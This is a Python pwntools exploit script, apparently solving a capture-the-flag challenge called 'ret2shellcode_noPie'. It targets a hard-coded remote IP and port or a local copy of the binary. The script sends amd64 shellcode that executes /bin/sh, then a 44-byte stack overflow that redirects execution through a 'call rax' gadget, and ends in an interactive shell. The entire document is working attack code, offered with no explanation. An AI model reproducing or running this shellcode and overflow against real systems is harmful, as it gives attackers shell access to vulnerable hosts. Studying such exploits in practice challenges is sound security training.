#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 13333
HOST = "103.70.114.29"
exe = context.binary = ELF('./ret2shellcode_noPie', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


shellcode = asm('''
	mov rax, 0x3b
	mov rdi, 0x0068732f6e69622f

	push rdi
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall

	''', arch = 'amd64')

p.sendline(shellcode)

call_rax = 0x0000000000401014

payload = flat(b'a'*44, call_rax)

p.sendline(payload)
p.interactive()
